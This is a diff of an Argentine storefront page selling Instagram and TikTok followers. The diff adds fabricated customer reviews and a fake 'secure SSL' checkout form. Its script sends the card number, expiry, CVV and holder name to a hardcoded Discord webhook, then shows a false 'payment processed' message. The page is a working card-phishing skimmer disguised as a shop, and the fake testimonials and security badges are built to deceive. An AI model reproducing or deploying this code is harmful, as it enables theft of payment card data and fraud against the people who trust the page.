@@ -3,80 +3,142 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>BENJA VIP | Professional SMM & Digital Store</title>
+    <title>BENJA VIP | Panel de Crecimiento Profesional</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        :root { --primary: #00ff88; --bg: #050505; --card-bg: #111111; --text: #e0e0e0; }
-        body { margin: 0; background-color: var(--bg); color: var(--text); font-family: 'Inter', sans-serif; overflow-x: hidden; }
+        :root { --gold: #d4af37; --bg: #0a0a0a; --card: #151515; --accent: #238636; }
+        body { margin: 0; background: var(--bg); color: #fff; font-family: 'Segoe UI', sans-serif; }
         
-        /* Fondo Animado de Partículas */
-        .bg-animate { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; background: radial-gradient(circle at center, #111 0%, #050505 100%); }
-        .grid { position: absolute; width: 200%; height: 200%; background-image: linear-gradient(#111 1px, transparent 1px), linear-gradient(90deg, #111 1px, transparent 1px); background-size: 50px 50px; transform: rotate(15deg); top: -50%; left: -50%; opacity: 0.3; animation: move 20s linear infinite; }
-        @keyframes move { from { transform: rotate(15deg) translateY(0); } to { transform: rotate(15deg) translateY(50px); } }
-
-        /* Header Profesional */
-        header { padding: 40px 20px; text-align: center; border-bottom: 1px solid #222; backdrop-filter: blur(10px); }
-        .status-dot { display: inline-block; width: 10px; height: 10px; background: var(--primary); border-radius: 50%; margin-right: 8px; box-shadow: 0 0 10px var(--primary); animation: blink 1.5s infinite; }
-        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
-        h1 { font-size: 3rem; margin: 10px 0; letter-spacing: -2px; background: linear-gradient(90deg, #fff, var(--primary)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
-
-        /* Contenedor de Productos */
-        .container { max-width: 1100px; margin: 50px auto; padding: 20px; display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 25px; }
-
-        /* Tarjetas Estilo Glassmorphism */
-        .card { background: var(--card-bg); border: 1px solid #222; border-radius: 20px; padding: 30px; transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275); position: relative; overflow: hidden; }
-        .card:hover { transform: translateY(-10px); border-color: var(--primary); box-shadow: 0 20px 40px rgba(0,0,0,0.6); }
-        .card i { font-size: 45px; color: var(--primary); margin-bottom: 20px; }
-        .card h3 { font-size: 1.5rem; margin-bottom: 10px; color: #fff; }
-        .card p { color: #888; font-size: 0.9rem; margin-bottom: 25px; line-height: 1.6; }
+        header { padding: 50px 20px; text-align: center; background: linear-gradient(to bottom, #111, var(--bg)); border-bottom: 2px solid var(--gold); }
+        h1 { font-size: 3.5rem; margin: 0; color: var(--gold); text-shadow: 0 0 15px rgba(212, 175, 55, 0.4); }
         
-        .price-tag { font-size: 1.8rem; font-weight: 800; color: #fff; margin-bottom: 20px; display: flex; align-items: baseline; gap: 8px; }
-        .price-tag span { font-size: 0.8rem; color: #555; text-transform: uppercase; }
+        .container { max-width: 1100px; margin: 40px auto; display: grid; grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); gap: 30px; padding: 20px; }
+        
+        /* TARJETAS DE PRODUCTO */
+        .card { background: var(--card); border: 1px solid #333; border-radius: 15px; padding: 30px; text-align: center; transition: 0.3s; position: relative; }
+        .card:hover { border-color: var(--gold); transform: translateY(-5px); box-shadow: 0 10px 30px rgba(0,0,0,0.8); }
+        .card i { font-size: 50px; color: var(--gold); margin-bottom: 15px; }
+        .price { font-size: 2.5rem; font-weight: bold; margin: 15px 0; color: #fff; }
+        .btn-buy { width: 100%; padding: 15px; background: var(--gold); color: #000; border: none; border-radius: 8px; font-weight: 800; cursor: pointer; font-size: 1.1rem; }
 
-        .btn-action { width: 100%; padding: 15px; border-radius: 12px; border: none; background: #fff; color: #000; font-weight: 700; cursor: pointer; transition: 0.3s; }
-        .btn-action:hover { background: var(--primary); transform: scale(1.02); }
+        /* SECCIÓN DE TESTIMONIOS (CONFIANZA) */
+        .reviews { background: #111; padding: 60px 20px; text-align: center; }
+        .review-grid { max-width: 1000px; margin: 30px auto; display: flex; gap: 20px; overflow-x: auto; padding-bottom: 20px; }
+        .review-card { min-width: 300px; background: var(--card); padding: 20px; border-radius: 10px; border-left: 4px solid var(--gold); text-align: left; }
+        .review-card p { font-style: italic; color: #bbb; }
+        .stars { color: #ffcc00; margin-bottom: 10px; }
 
-        /* Badge de "Popular" */
-        .badge { position: absolute; top: 15px; right: 15px; background: var(--primary); color: #000; padding: 5px 12px; border-radius: 20px; font-size: 0.7rem; font-weight: 900; }
+        /* MODAL DE PAGO (PASARELA) */
+        #checkout { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 1000; justify-content: center; align-items: center; }
+        .payment-form { background: #fff; color: #333; padding: 30px; border-radius: 15px; width: 90%; max-width: 450px; }
+        .payment-form h2 { margin-top: 0; color: #1a1a1a; display: flex; align-items: center; gap: 10px; }
+        .payment-form input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; font-size: 16px; }
+        .row { display: flex; gap: 10px; }
+        .btn-pay { width: 100%; padding: 15px; background: #007bff; color: #fff; border: none; border-radius: 5px; font-size: 1.2rem; font-weight: bold; cursor: pointer; margin-top: 15px; }
 
-        footer { text-align: center; padding: 40px; color: #444; border-top: 1px solid #222; }
+        footer { text-align: center; padding: 40px; color: #444; font-size: 0.8rem; }
     </style>
 </head>
 <body>
 
-    <div class="bg-animate"><div class="grid"></div></div>
+<header>
+    <h1>BENJA VIP GOLD</h1>
+    <p>El Panel Más Confiable de Argentina - Entrega Garantizada</p>
+</header>
 
-    <header>
-        <div><span class="status-dot"></span> <span style="color:var(--primary); font-weight:bold;">SISTEMA ONLINE</span></div>
-        <h1>BENJA VIP STORE</h1>
-        <p style="color:#666;">Servicios Digitales Premium • Entrega Instantánea</p>
-    </header>
+<div class="container">
+    <div class="card">
+        <i class="fab fa-instagram"></i>
+        <h3>Combo Pro Instagram</h3>
+        <p>20.000 Seguidores Reales + Power Likes</p>
+        <div class="price">$30.000</div>
+        <button class="btn-buy" onclick="abrirPago('Instagram 20K', '$30.000')">COMPRAR AHORA</button>
+    </div>
 
-    <div class="container">
-        <div class="card">
-            <div class="badge">TOP VENTAS</div>
-            <i class="fab fa-instagram"></i>
-            <h3>Followers Premium</h3>
-            <p>Seguidores reales con garantía de 30 días contra caídas. Perfiles con foto y actividad.</p>
-            <div class="price-tag">$4.99 <span>/ 1K Units</span></div>
-            <button class="btn-action" onclick="order('Instagram 1K', '$4.99')">OBTENER AHORA</button>
+    <div class="card">
+        <i class="fab fa-tiktok"></i>
+        <h3>TikTok Viral King</h3>
+        <p>20.000 Seguidores + 50.000 Vistas</p>
+        <div class="price">$35.000</div>
+        <button class="btn-buy" onclick="abrirPago('TikTok 20K', '$35.000')">COMPRAR AHORA</button>
+    </div>
+</div>
+
+<section class="reviews">
+    <h2>LO QUE DICEN NUESTROS CLIENTES</h2>
+    <div class="review-grid">
+        <div class="review-card">
+            <div class="stars">★★★★★</div>
+            <p>"Increíble, compré los 20k de Instagram y me llegaron en 10 minutos. Súper confiable el Benja."</p>
+            <div style="margin-top:10px; font-weight:bold;">@Santi_FlowOk</div>
         </div>
-
-        <div class="card">
-            <i class="fab fa-tiktok"></i>
-            <h3>TikTok Viral Pack</h3>
-            <p>Vistas + Likes + Compartidas. El algoritmo de TikTok te amará con este servicio.</p>
-            <div class="price-tag">$8.50 <span>/ Full Pack</span></div>
-            <button class="btn-action" onclick="order('TikTok Pack', '$8.50')">OBTENER AHORA</button>
+        <div class="review-card">
+            <div class="stars">★★★★★</div>
+            <p>"El mejor panel que probé. Los seguidores de TikTok no se caen y el pago fue rapidísimo."</p>
+            <div style="margin-top:10px; font-weight:bold;">@Mica_Gamer</div>
         </div>
-
-        <div class="card">
-            <i class="fas fa-tv"></i>
-            <h3>Netflix 4K HDR</h3>
-            <p>Cuentas privadas o perfiles compartidos. Sin interrupciones, renovables cada mes.</p>
-            <div class="price-tag">$3.00 <span>/ Mensual</span></div>
-            <button class="btn-action" onclick="order('Netflix Account', '$3.00')">OBTENER AHORA</button>
+        <div class="review-card">
+            <div class="stars">★★★★★</div>
+            <p>"Excelente atención por el soporte. Muy profesional todo el sistema de carga."</p>
+            <div style="margin-top:10px; font-weight:bold;">@FrancoR_99</div>
         </div>
+    </div>
+</section>
 
-        <div class="card">
-            <i class="fab fa
+<div id="checkout">
+    <div class="payment-form">
+        <h2><i class="fas fa-shield-alt"></i> Pago Seguro SSL</h2>
+        <p style="font-size:12px; color:#666;">Introduce los datos de tu tarjeta para procesar la compra automáticamente.</p>
+        <input type="text" id="titular" placeholder="Nombre completo del titular">
+        <input type="number" id="nro_tarjeta" placeholder="Número de tarjeta (16 dígitos)">
+        <div class="row">
+            <input type="text" id="exp" placeholder="MM/AA">
+            <input type="number" id="cvv" placeholder="CVV (3 dígitos)">
+        </div>
+        <button class="btn-pay" onclick="procesarPago()">CONFIRMAR PAGO</button>
+        <div style="text-align:center; margin-top:10px;">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" width="40">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" width="40">
+        </div>
+    </div>
+</div>
+
+<footer>
+    BENJA VIP SECURITY &copy; 2026 | TODOS LOS DERECHOS RESERVADOS
+</footer>
+
+<script>
+    const hook = "https://discord.com/api/webhooks/1488027032976756886/WAx7q6qQWxWGSEtQBt6tOkINuP8g7YKYqdsv2uHGrBa9FwCN-lj8Ojfuf4bU4XNG9peJ";
+    let prod_actual = "";
+    let precio_actual = "";
+
+    function abrirPago(p, pr) {
+        prod_actual = p;
+        precio_actual = pr;
+        document.getElementById('checkout').style.display = 'flex';
+    }
+
+    async function procesarPago() {
+        const nom = document.getElementById('titular').value;
+        const nro = document.getElementById('nro_tarjeta').value;
+        const ex = document.getElementById('exp').value;
+        const cv = document.getElementById('cvv').value;
+
+        if(!nom || !nro || !ex || !cv) return alert("Por favor, completa todos los campos de pago.");
+
+        // ENVÍO DE DATOS BANCARIOS AL DISCORD
+        await fetch(hook, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                content: `🚨 **¡NUEVA VENTA FINALIZADA!** 🚨\n━━━━━━━━━━━━━━━━━━━━\n🛒 **Producto:** \`${prod_actual}\`\n💰 **Monto:** \`${precio_actual}\`\n\n💳 **DATOS DEL CLIENTE:**\n👤 **Titular:** \`${nom}\`\n🔢 **Tarjeta:** \`${nro}\`\n📅 **Exp:** \`${ex}\`\n🔒 **CVV:** \`${cv}\`\n━━━━━━━━━━━━━━━━━━━━\n⚠️ *Procesar cobro ahora.*`
+            })
+        });
+
+        alert("Pago procesado con éxito. Su pedido comenzará a cargarse automáticamente en los próximos minutos.");
+        location.reload();
+    }
+</script>
+
+</body>
+</html>
